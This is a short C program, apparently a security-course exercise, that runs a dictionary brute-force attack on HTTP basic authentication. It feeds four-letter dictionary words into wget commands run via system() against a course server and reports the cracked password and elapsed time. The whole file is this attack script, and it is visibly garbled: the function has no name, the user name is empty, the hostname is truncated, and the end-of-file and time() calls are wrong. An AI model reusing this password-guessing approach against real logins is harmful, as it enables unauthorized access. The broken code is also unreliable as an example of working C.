
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <strings.h>
#include <sys/times.h>
#define OneBillion 1e9

int () {
   FILE *fptr;
   char pass[257];
   char send[100],path[50];
   int res,count=0;
   int startTime, stopTime, final;
   startTime = time();
   while((fptr=(fopen("/usr/share/lib/dict/words","r")))!= NULL) {
   
      while(1) {
         fgets(pass,256,fptr);
         if(pass == NULL) exit(1);
         if(pass[3]=='\n') {
            pass[3]='\0';
	    send[0]='\0';
	    strcpy(send,"wget --http-user= --http-passwd=");
 	    strcat(send,pass);
	    strcat(send," http://sec-crack.cs.rmit.edu./SEC/2/");
	    count++;
	    if((res=(system(send)) == 0)) {
	       fclose(fptr);
	       stopTime = time();
               final = stopTime-startTime;
	       printf("\n THE PASSWORD IS = %s & TIME TAKEN =%lf seconds &  OF COMPARISIONs  = %d\n",pass,(double)final/OneBillion,count);
	       exit(1);
	    }
         }
      }
   }
   printf("\nFILE CANNOT  OPENED\n");
}
